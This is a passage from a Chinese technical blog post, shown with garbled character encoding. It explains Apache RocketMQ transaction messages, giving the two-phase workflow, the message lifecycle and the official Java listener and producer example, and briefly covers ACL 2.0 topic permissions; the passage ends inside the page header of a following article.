<p>äº‹åŠ¡æ¶ˆæ¯ä¸º Apache RocketMQ ä¸­çš„é«˜çº§ç‰¹æ€§æ¶ˆæ¯ï¼Œæœ¬æ–‡ä¸ºæ‚¨ä»‹ç»äº‹åŠ¡æ¶ˆæ¯çš„åº”ç”¨åœºæ™¯ã€åŠŸèƒ½åŸç†ã€ä½¿ç”¨é™åˆ¶ã€ä½¿ç”¨æ–¹æ³•å’Œä½¿ç”¨å»ºè®®ã€‚</p>
<blockquote>
<p>äº‹åŠ¡æ¶ˆæ¯æ˜¯ Apache RocketMQ æä¾›çš„ä¸€ç§é«˜çº§æ¶ˆæ¯ç±»å‹ï¼Œæ”¯æŒåœ¨åˆ†å¸ƒå¼åœºæ™¯ä¸‹ä¿éšœæ¶ˆæ¯ç”Ÿäº§å’Œæœ¬åœ°äº‹åŠ¡çš„æœ€ç»ˆä¸€è‡´æ€§ã€‚</p>
</blockquote>
<h4 data-id="heading-29">8.1 å·¥ä½œæµç¨‹</h4>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6185b6c4e9440eb88353f74cb0a1205~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCS5pS-5ZCn5b635b63:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523170&amp;x-signature=axdr%2BJADgeahEhd%2BWsZlGnoAnto%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>ç®€å•çš„æè¿°ä»¥ä¸Šå†…å®¹ï¼ˆåç»­ä¼šæœ‰æ–‡ç« æ¥å•ç‹¬ä»‹ç»ï¼Œå…·ä½“å†…å®¹è¯·çœ‹åŸæ–‡ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Frocketmq.apache.org%2Fzh%2Fdocs%2FfeatureBehavior%2F04transactionmessage%2F%3Ff_link_type%3Df_linkinlinenote%26flow_extra%3DeyJpbmxpbmVfZGlzcGxheV9wb3NpdGlvbiI6MCwiZG9jX3Bvc2l0aW9uIjowLCJkb2NfaWQiOiI0OTViMWYyMzhjNTQ3NzQwLTYwYTNhMTQ0MDNlMTA1YjUifQ%253D%253D" target="_blank" title="https://rocketmq.apache.org/zh/docs/featureBehavior/04transactionmessage/?f_link_type=f_linkinlinenote&amp;flow_extra=eyJpbmxpbmVfZGlzcGxheV9wb3NpdGlvbiI6MCwiZG9jX3Bvc2l0aW9uIjowLCJkb2NfaWQiOiI0OTViMWYyMzhjNTQ3NzQwLTYwYTNhMTQ0MDNlMTA1YjUifQ%3D%3D" ref="nofollow noopener noreferrer">äº‹åŠ¡æ¶ˆæ¯ | RocketMQ</a>ï¼‰</p>
<p><strong>é¦–å…ˆ</strong>ï¼Œç”Ÿäº§è€…å°†æ¶ˆæ¯å‘é€è‡³Apache RocketMQæœåŠ¡ç«¯ï¼Œå®é™…ä¸Šæ˜¯å‘ Brokerï¼ˆServerï¼‰å‘é€ä¸€æ¡ â€œåŠæ¶ˆæ¯â€ï¼ˆHalf Messageï¼‰ï¼ŒBroker ç¡®è®¤æ¥æ”¶æˆåŠŸåï¼Œè¿™æ¡æ¶ˆæ¯æš‚æ—¶ä¸ä¼šæŠ•é€’ç»™æ¶ˆè´¹è€…ã€‚<strong>ç„¶å</strong>ç”Ÿäº§è€…å¼€å§‹æ‰§è¡Œæœ¬åœ°ä¸šåŠ¡äº‹åŠ¡ï¼ˆæ¯”å¦‚æ•°æ®åº“æ“ä½œï¼‰ï¼Œç¡®ä¿ä¸šåŠ¡é€»è¾‘å’Œæ¶ˆæ¯å‘é€çš„ä¸€è‡´æ€§ã€‚<strong>æ¥ç€</strong>æœ¬åœ°äº‹åŠ¡æ‰§è¡Œå®Œæˆåï¼Œç”Ÿäº§è€…å‘ Broker å‘é€ Commitï¼ˆäº‹åŠ¡æˆåŠŸï¼‰æˆ– Rollbackï¼ˆäº‹åŠ¡å¤±è´¥ï¼‰æŒ‡ä»¤ï¼Œå‘ŠçŸ¥ Broker æœ€ç»ˆå¤„ç†ç»“æœã€‚äº‹åŠ¡çŠ¶æ€å›æŸ¥æœ‰è¡¥å¿æœºåˆ¶ï¼Œå¦‚æœ Broker é•¿æ—¶é—´æœªæ”¶åˆ°ç”Ÿäº§è€…çš„æŒ‡ä»¤ï¼Œä¼šä¸»åŠ¨è§¦å‘äº‹åŠ¡å›æŸ¥ï¼Œå‘ç”Ÿäº§è€…è¯¢é—®æœ¬åœ°äº‹åŠ¡çš„æœ€ç»ˆçŠ¶æ€ï¼›ç”Ÿäº§è€…é‡æ–°æ£€æŸ¥æœ¬åœ°äº‹åŠ¡å¹¶åé¦ˆç»“æœã€‚<strong>æœ€å</strong> Broker æ”¶åˆ° Commit æŒ‡ä»¤æ—¶ï¼Œä¼šå°†åŠæ¶ˆæ¯æ­£å¼æŠ•é€’ç»™æ¶ˆè´¹è€…ï¼ˆSubscriberï¼‰ï¼›æ”¶åˆ° Rollback æŒ‡ä»¤æ—¶ï¼Œåˆ™ç›´æ¥ä¸¢å¼ƒåŠæ¶ˆæ¯ï¼Œä¸è¿›è¡ŒæŠ•é€’ã€‚</p>
</blockquote>
<h4 data-id="heading-30">8.2 ç”Ÿå‘½å‘¨æœŸ</h4>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/95a4613d1ba6427ba226dca41bee43a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCS5pS-5ZCn5b635b63:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523170&amp;x-signature=pS%2BjqErIaer6goD3KOZxKMUKN3Q%3D" alt="" loading="lazy"/></p>
<ul>
<li>åˆå§‹åŒ–ï¼šåŠäº‹åŠ¡æ¶ˆæ¯è¢«ç”Ÿäº§è€…æ„å»ºå¹¶å®Œæˆåˆå§‹åŒ–ï¼Œå¾…å‘é€åˆ°æœåŠ¡ç«¯çš„çŠ¶æ€ã€‚</li>
<li>äº‹åŠ¡å¾…æäº¤ï¼šåŠäº‹åŠ¡æ¶ˆæ¯è¢«å‘é€åˆ°æœåŠ¡ç«¯ï¼Œå’Œæ™®é€šæ¶ˆæ¯ä¸åŒï¼Œå¹¶ä¸ä¼šç›´æ¥è¢«æœåŠ¡ç«¯æŒä¹…åŒ–ï¼Œè€Œæ˜¯ä¼šè¢«å•ç‹¬å­˜å‚¨åˆ°äº‹åŠ¡å­˜å‚¨ç³»ç»Ÿä¸­ï¼Œç­‰å¾…ç¬¬äºŒé˜¶æ®µæœ¬åœ°äº‹åŠ¡è¿”å›æ‰§è¡Œç»“æœåå†æäº¤ã€‚æ­¤æ—¶æ¶ˆæ¯å¯¹ä¸‹æ¸¸æ¶ˆè´¹è€…ä¸å¯è§ã€‚</li>
<li>æ¶ˆæ¯å›æ»šï¼šç¬¬äºŒé˜¶æ®µå¦‚æœäº‹åŠ¡æ‰§è¡Œç»“æœæ˜ç¡®ä¸ºå›æ»šï¼ŒæœåŠ¡ç«¯ä¼šå°†åŠäº‹åŠ¡æ¶ˆæ¯å›æ»šï¼Œè¯¥äº‹åŠ¡æ¶ˆæ¯æµç¨‹ç»ˆæ­¢ã€‚</li>
<li>æäº¤å¾…æ¶ˆè´¹ï¼šç¬¬äºŒé˜¶æ®µå¦‚æœäº‹åŠ¡æ‰§è¡Œç»“æœæ˜ç¡®ä¸ºæäº¤ï¼ŒæœåŠ¡ç«¯ä¼šå°†åŠäº‹åŠ¡æ¶ˆæ¯é‡æ–°å­˜å‚¨åˆ°æ™®é€šå­˜å‚¨ç³»ç»Ÿä¸­ï¼Œæ­¤æ—¶æ¶ˆæ¯å¯¹ä¸‹æ¸¸æ¶ˆè´¹è€…å¯è§ï¼Œç­‰å¾…è¢«æ¶ˆè´¹è€…è·å–å¹¶æ¶ˆè´¹ã€‚</li>
<li>æ¶ˆè´¹ä¸­ï¼šæ¶ˆæ¯è¢«æ¶ˆè´¹è€…è·å–ï¼Œå¹¶æŒ‰ç…§æ¶ˆè´¹è€…æœ¬åœ°çš„ä¸šåŠ¡é€»è¾‘è¿›è¡Œå¤„ç†çš„è¿‡ç¨‹ã€‚ æ­¤æ—¶æœåŠ¡ç«¯ä¼šç­‰å¾…æ¶ˆè´¹è€…å®Œæˆæ¶ˆè´¹å¹¶æäº¤æ¶ˆè´¹ç»“æœï¼Œå¦‚æœä¸€å®šæ—¶é—´åæ²¡æœ‰æ”¶åˆ°æ¶ˆè´¹è€…çš„å“åº”ï¼ŒApache RocketMQä¼šå¯¹æ¶ˆæ¯è¿›è¡Œé‡è¯•å¤„ç†ã€‚å…·ä½“ä¿¡æ¯ã€‚</li>
<li>æ¶ˆè´¹æäº¤ï¼šæ¶ˆè´¹è€…å®Œæˆæ¶ˆè´¹å¤„ç†ï¼Œå¹¶å‘æœåŠ¡ç«¯æäº¤æ¶ˆè´¹ç»“æœï¼ŒæœåŠ¡ç«¯æ ‡è®°å½“å‰æ¶ˆæ¯å·²ç»è¢«å¤„ç†ï¼ˆåŒ…æ‹¬æ¶ˆè´¹æˆåŠŸå’Œå¤±è´¥ï¼‰ã€‚ Apache RocketMQé»˜è®¤æ”¯æŒä¿ç•™æ‰€æœ‰æ¶ˆæ¯ï¼Œæ­¤æ—¶æ¶ˆæ¯æ•°æ®å¹¶ä¸ä¼šç«‹å³è¢«åˆ é™¤ï¼Œåªæ˜¯é€»è¾‘æ ‡è®°å·²æ¶ˆè´¹ã€‚æ¶ˆæ¯åœ¨ä¿å­˜æ—¶é—´åˆ°æœŸæˆ–å­˜å‚¨ç©ºé—´ä¸è¶³è¢«åˆ é™¤å‰ï¼Œæ¶ˆè´¹è€…ä»ç„¶å¯ä»¥å›æº¯æ¶ˆæ¯é‡æ–°æ¶ˆè´¹ã€‚</li>
<li>æ¶ˆæ¯åˆ é™¤ï¼šApache RocketMQæŒ‰ç…§æ¶ˆæ¯ä¿å­˜æœºåˆ¶æ»šåŠ¨æ¸…ç†æœ€æ—©çš„æ¶ˆæ¯æ•°æ®ï¼Œå°†æ¶ˆæ¯ä»ç‰©ç†æ–‡ä»¶ä¸­åˆ é™¤ã€‚</li>
</ul>
<h4 data-id="heading-31">8.3 å®˜æ–¹å®ä¾‹ä»£ç </h4>
<p>â‘  å®ç° TransactionListener æ¥å£</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransactionListenerImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">TransactionListener</span> {
    <span class="hljs-comment">// åŸå­æ•´å‹ï¼šç”Ÿæˆè‡ªå¢æ•°å€¼ï¼Œæ¨¡æ‹Ÿä¸åŒçš„æœ¬åœ°äº‹åŠ¡ç»“æœï¼ˆçº¿ç¨‹å®‰å…¨ï¼Œé€‚é…å¤šçº¿ç¨‹å‘é€åœºæ™¯ï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">transactionIndex</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
    <span class="hljs-comment">// å¹¶å‘å“ˆå¸Œè¡¨ï¼šå­˜å‚¨ã€Œäº‹åŠ¡æ¶ˆæ¯ID-äº‹åŠ¡çŠ¶æ€ã€çš„æ˜ å°„ï¼Œä¾›å›æŸ¥æ—¶ä½¿ç”¨ï¼ˆçº¿ç¨‹å®‰å…¨ï¼‰</span>
    <span class="hljs-keyword">private</span> ConcurrentHashMap&lt;String, Integer&gt; localTrans = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();

    <span class="hljs-comment">// æ‰§è¡Œæœ¬åœ°äº‹åŠ¡</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> LocalTransactionState <span class="hljs-title function_">executeLocalTransaction</span><span class="hljs-params">(Message msg, Object arg)</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> transactionIndex.getAndIncrement();
        <span class="hljs-type">int</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> value % <span class="hljs-number">3</span>;
        localTrans.put(msg.getTransactionId(), status);
        <span class="hljs-keyword">return</span> LocalTransactionState.UNKNOW;
    }

    <span class="hljs-comment">// å›æŸ¥äº‹åŠ¡çŠ¶æ€</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> LocalTransactionState <span class="hljs-title function_">checkLocalTransaction</span><span class="hljs-params">(MessageExt msg)</span> {
        <span class="hljs-type">Integer</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> localTrans.get(msg.getTransactionId());
        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != status) {
            <span class="hljs-keyword">switch</span> (status) {
                <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:
                    <span class="hljs-keyword">return</span> LocalTransactionState.UNKNOW;
                <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
                    <span class="hljs-keyword">return</span> LocalTransactionState.COMMIT_MESSAGE;
                <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:
                    <span class="hljs-keyword">return</span> LocalTransactionState.ROLLBACK_MESSAGE;
                <span class="hljs-keyword">default</span>:
                    <span class="hljs-keyword">return</span> LocalTransactionState.COMMIT_MESSAGE;
            }
        }
        <span class="hljs-keyword">return</span> LocalTransactionState.COMMIT_MESSAGE;
    }
}
</code></pre>
<p>â‘¡ ç”Ÿäº§è€…</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransactionProducer</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">PRODUCER_GROUP</span> <span class="hljs-operator">=</span> <span class="hljs-string">"please_rename_unique_group_name"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_NAMESRVADDR</span> <span class="hljs-operator">=</span> <span class="hljs-string">"127.0.0.1:9876"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TOPIC</span> <span class="hljs-operator">=</span> <span class="hljs-string">"TopicTest1234"</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MESSAGE_COUNT</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MQClientException, InterruptedException {
        <span class="hljs-type">TransactionListener</span> <span class="hljs-variable">transactionListener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransactionListenerImpl</span>();
        <span class="hljs-type">TransactionMQProducer</span> <span class="hljs-variable">producer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransactionMQProducer</span>(PRODUCER_GROUP);

        producer.setNamesrvAddr(DEFAULT_NAMESRVADDR);
        <span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executorService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(<span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">100</span>, TimeUnit.SECONDS, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="hljs-number">2000</span>), r -&gt; {
            <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r);
            thread.setName(<span class="hljs-string">"client-transaction-msg-check-thread"</span>);
            <span class="hljs-keyword">return</span> thread;
        });

        producer.setExecutorService(executorService);
        producer.setTransactionListener(transactionListener);
        producer.start();

        String[] tags = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] {<span class="hljs-string">"TagA"</span>, <span class="hljs-string">"TagB"</span>, <span class="hljs-string">"TagC"</span>, <span class="hljs-string">"TagD"</span>, <span class="hljs-string">"TagE"</span>};
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; MESSAGE_COUNT; i++) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-type">Message</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span>
                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>(TOPIC, tags[i % tags.length], <span class="hljs-string">"KEY"</span> + i,
                        (<span class="hljs-string">"Hello RocketMQ "</span> + i).getBytes(RemotingHelper.DEFAULT_CHARSET));
                <span class="hljs-type">SendResult</span> <span class="hljs-variable">sendResult</span> <span class="hljs-operator">=</span> producer.sendMessageInTransaction(msg, <span class="hljs-literal">null</span>);
                System.out.printf(<span class="hljs-string">"%s%n"</span>, sendResult);

                Thread.sleep(<span class="hljs-number">10</span>);
            } <span class="hljs-keyword">catch</span> (MQClientException | UnsupportedEncodingException e) {
                e.printStackTrace();
            }
        }

        <span class="hljs-comment">// ä¿æŒç¨‹åºè¿è¡Œï¼ˆå…³é”®ï¼å¦åˆ™ç”Ÿäº§è€…å…³é—­åæ— æ³•æ¥æ”¶å›æŸ¥å›è°ƒï¼‰</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100000</span>; i++) {
            Thread.sleep(<span class="hljs-number">1000</span>);
        }
        producer.shutdown();
    }
}
</code></pre>
<p>è¿™ä¸¤æ®µä»£ç ï¼Œå…¶ä¸­ <code>TransactionListenerImpl</code> æ˜¯äº‹åŠ¡ç›‘å¬å™¨çš„å®ç°ç±»ï¼ˆè´Ÿè´£å¤„ç†æœ¬åœ°äº‹åŠ¡å’Œäº‹åŠ¡å›æŸ¥ï¼‰ï¼Œ<code>TransactionProducer</code> æ˜¯äº‹åŠ¡æ¶ˆæ¯ç”Ÿäº§è€…ï¼ˆè´Ÿè´£å‘é€äº‹åŠ¡æ¶ˆæ¯å¹¶é©±åŠ¨æ•´ä¸ªæµç¨‹ï¼‰ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">LocalTransactionState</span> {
    COMMIT_MESSAGE, <span class="hljs-comment">// â€œæäº¤â€ï¼Œæ¶ˆæ¯å¯¹æ¶ˆè´¹è€…å¯è§ï¼›</span>
    ROLLBACK_MESSAGE, <span class="hljs-comment">// â€œå›æ»šâ€ï¼Œæ¶ˆæ¯è¢«ä¸¢å¼ƒï¼›</span>
    UNKNOW; <span class="hljs-comment">//  â€œæœªçŸ¥â€ï¼ŒRocketMQ ä¼šç»§ç»­å›æŸ¥ï¼ˆç›´åˆ°è¶…æ—¶ï¼‰ï¼›</span>
}
</code></pre>
<p>å½“ <code>executeLocalTransaction</code> è¿”å› <code>UNKNOW</code>ï¼Œæˆ–ç”Ÿäº§è€…ä¸ <code>RocketMQ</code> é€šä¿¡å¼‚å¸¸æ—¶ï¼Œ<code>RocketMQ</code>ä¼šå®šæ—¶å›è°ƒè¯¥æ–¹æ³•ï¼Œç¡®è®¤æœ¬åœ°äº‹åŠ¡æœ€ç»ˆçŠ¶æ€ï¼›</p>
<p>å¿…é¡»ä½¿ç”¨ <code>TransactionMQProducer</code>æ¥å‘é€æ¶ˆæ¯ã€‚</p>
<h3 data-id="heading-32">9 ACL æƒé™æ§åˆ¶æœºåˆ¶</h3>
<p>è®¿é—®æ§åˆ¶ 2.0ï¼ˆACL 2.0ï¼‰æ˜¯Apache RocketMQçš„è®¿é—®æ§åˆ¶åˆ—è¡¨(Access Control List)å‡çº§ç‰ˆæœ¬ï¼Œæä¾›äº†å®Œå–„çš„èº«ä»½è®¤è¯(Authentication)å’Œæƒé™æˆæƒ(Authorization)æœºåˆ¶ï¼Œç”¨äºä¿æŠ¤RocketMQé›†ç¾¤çš„æ•°æ®å®‰å…¨ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥åœ¨æ§åˆ¶ç•Œé¢ç»™ topic è®¾ç½®æƒé™</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/366e84d27fff4c1fb7ca6ccd56d2bf74~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCS5pS-5ZCn5b635b63:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523170&amp;x-signature=WFe8OwyXH6tJdcwCbyyZQnd6Lxo%3D" alt="" loading="lazy"/></p>
<p>å¦‚å›¾ä¸­çš„ perm è¡¨ç¤º topic çš„æƒé™ï¼Œæœ‰ä¸‰ä¸ªå¯é€‰é¡¹ã€‚ 2ï¼šç¦å†™ç¦è®¢é˜…ï¼Œ4ï¼šå¯è®¢é˜…ï¼Œä¸èƒ½å†™ï¼Œ6ï¼šå¯å†™å¯è®¢é˜…ã€‚</p>
<blockquote>
<p>åœ¨Brokerç«¯è¿˜æä¾›äº†æ›´è¯¦ç»†çš„æƒé™æ§åˆ¶æœºåˆ¶ã€‚ä¸»è¦æ˜¯åœ¨broker.confä¸­æ‰“å¼€aclçš„æ ‡å¿—ï¼šaclEnable=trueã€‚å°±å¯ä»¥ç”¨plain_acl.ymlæ¥è¿›â¾æƒé™é…ç½®äº†ï¼Œå¹¶ä¸”æ˜¯çƒ­åŠ è½½ï¼Œæ— éœ€é‡å¯ã€‚</p>
<p><strong>ä½†æ˜¯æˆ‘è¿™ä¸ªæ˜¯ 2.0ï¼Œåœ¨ ACL2.0 è¿™ç§æ–¹æ³•å·²ç»è¢«ç§»é™¤äº†ï¼ˆåç»­æ–‡ç« å°†è¯¦ç»†æå†™ï¼‰ã€‚</strong></p>
</blockquote>
<p>ACL 2.0 å¯ä»¥é€šè¿‡é…ç½® broker.conf æ¥è®¾ç½®è®¤è¯æˆæƒç­‰ã€‚</p>
<h3 data-id="heading-33">æ€»ç»“</h3>
<p>RocketMQ å®¢æˆ·ç«¯æ¶ˆæ¯æœºåˆ¶å…·å¤‡æ¸…æ™°çš„ä½¿ç”¨é€»è¾‘ä¸å®Œå–„çš„å¯é æ€§ä¿éšœï¼šç”Ÿäº§è€…ã€æ¶ˆè´¹è€…å‡æœ‰å›ºå®šç¼–ç¨‹æ­¥éª¤ï¼›æ¶ˆæ¯ç¡®è®¤æœºåˆ¶åˆ†ç”Ÿäº§ç«¯ï¼ˆåŒæ­¥ / å¼‚æ­¥ / å•å‘å‘é€çš„å·®å¼‚åŒ–ç¡®è®¤ï¼Œå…³è” Broker åˆ·ç›˜ / å¤åˆ¶ç­–ç•¥ï¼‰å’Œæ¶ˆè´¹ç«¯ï¼ˆåŸºäº Offset çš„è‡ªåŠ¨ / æ‰‹åŠ¨ç¡®è®¤ï¼Œå«é‡è¯•ã€æ­»ä¿¡é˜Ÿåˆ—ç­‰å…œåº•ï¼‰ï¼›æ¶ˆè´¹æ¨¡å¼æ”¯æŒé›†ç¾¤ï¼ˆè´Ÿè½½å‡è¡¡ï¼ŒBroker ç®¡ç† Offsetï¼‰ä¸å¹¿æ’­ï¼ˆå…¨é‡æ¶ˆè´¹ï¼Œæœ¬åœ°ç»´æŠ¤ Offsetï¼‰ï¼›æ¶ˆæ¯è¿‡æ»¤å¯é€šè¿‡ Tagï¼ˆç®€å•é«˜æ•ˆï¼‰æˆ– SQL92ï¼ˆå¤æ‚çµæ´»ï¼‰åœ¨ Broker ç«¯å®ç°ï¼Œå‡å°‘æ— æ•ˆä¼ è¾“ã€‚</p>
<hr/>
<p><em>è½¬å‘è¯·æºå¸¦ä½œè€…ä¿¡æ¯</em>Â  <strong>@æ€’æ”¾å§å¾·å¾· @ä¸€ä¸ªæœ‰æ¢¦æœ‰æˆçš„äºº</strong><br/>
æŒç»­åˆ›ä½œå¾ˆä¸å®¹æ˜“ï¼Œä½œè€…å°†ä»¥å°½å¯èƒ½çš„è¯¦ç»†æŠŠæ‰€å­¦çŸ¥è¯†åˆ†äº«å„ä½å¼€å‘è€…ï¼Œä¸€èµ·è¿›æ­¥ä¸€èµ·å­¦ä¹ ã€‚<strong>è½¬è½½è¯·æºå¸¦é“¾æ¥ï¼Œè½¬è½½åˆ°å¾®ä¿¡å…¬ä¼—å·è¯·å‹¿é€‰æ‹©åŸåˆ›ï¼Œè°¢è°¢ï¼</strong><br/>
ğŸ‘åˆ›ä½œä¸æ˜“ï¼Œå¦‚æœ‰é”™è¯¯è¯·æŒ‡æ­£ï¼Œæ„Ÿè°¢è§‚çœ‹ï¼è®°å¾—ç‚¹èµå“¦ï¼ğŸ‘<br/>
è°¢è°¢æ”¯æŒï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä½¿ç”¨ seekdb + PowerMem æ„å»ºå¤šæ¨¡æ€æ™ºèƒ½è®°å¿†ç³»ç»Ÿ MemBox]]></title>    <link>https://juejin.cn/post/7597243334177456168</link>    <guid>https://juejin.cn/post/7597243334177456168</guid>    <pubDate>2026-01-20T14:16:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597243334177456168" data-draft-id="7597326073671483407" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä½¿ç”¨ seekdb + PowerMem æ„å»ºå¤šæ¨¡æ€æ™ºèƒ½è®°å¿†ç³»ç»Ÿ MemBox"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-20T14:16:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Se7en258"/> <meta itemprop="url" content="https://juejin.cn/user/1028798616450734"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä½¿ç”¨ seekdb + PowerMem æ„å»ºå¤šæ¨¡æ€æ™ºèƒ½è®°å¿†ç³»ç»Ÿ MemBox
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1028798616450734/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Se7en258
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T14:16:00.000Z" title="Tue Jan 20 2026 14:16:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»14åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body 